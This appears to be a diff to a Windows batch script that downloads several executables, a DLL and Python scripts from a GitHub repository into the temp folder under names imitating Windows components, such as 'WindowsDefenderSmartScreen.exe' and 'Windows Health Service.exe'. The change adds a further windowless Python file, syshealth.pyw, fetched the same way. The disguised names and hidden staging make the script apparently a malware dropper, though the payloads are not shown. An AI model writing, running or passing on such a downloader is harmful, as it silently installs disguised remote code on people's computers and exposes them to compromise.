@@ -10,9 +10,10 @@ set "FILE3=%temp%\Windows Health Service.exe"
 set "FILE4=%temp%\by.py"
 set "FILE5=%temp%\Pancafediag.exe"
 set "FILE6=%temp%\PncDiag.dll"
+set "FILE7=%temp%\syshealth.pyw"
 
 :: Tüm dosyaların varlığını tek tek kontrol et
-if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" (
+if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
     exit
 )
 
@@ -23,6 +24,7 @@ curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WindowsDefenderSmartScreen.exe" -o "%FILE3%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/Pancafediag.exe" -o "%FILE5%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/PncDiag.dll" -o "%FILE6%"
+curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/syshealth.pyw" -o "%FILE7%"
 
 
 exit
